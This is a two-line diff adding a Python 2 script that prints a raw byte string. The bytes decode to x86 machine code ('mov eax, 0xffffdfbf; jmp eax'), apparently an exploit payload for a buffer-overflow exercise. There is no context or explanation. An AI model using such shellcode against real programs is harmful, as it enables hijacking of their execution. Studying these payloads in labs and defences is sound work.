@@ -1,0 +1,2 @@
+#!/bin/python2
+print(b'\xb8\xbf\xdf\xff\xff\xff\xe0')
